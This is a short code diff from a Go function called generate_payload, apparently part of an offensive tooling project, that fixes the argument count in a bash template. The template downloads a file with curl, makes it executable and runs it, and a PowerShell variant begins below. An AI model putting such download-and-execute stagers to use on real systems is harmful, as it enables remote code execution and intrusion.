@@ -261,7 +261,7 @@ func generate_payload(payload_name string, sleep_interval string,
 		tmp := random_string(4)
 		bash = fmt.Sprintf(`
 			curl %s > %s; chmod +x %s; ./%s
-			`, url, tmp, tmp)
+			`, url, tmp, tmp, tmp)
 		powershell = fmt.Sprintf(`
 			$url = %s
 			$out = %s
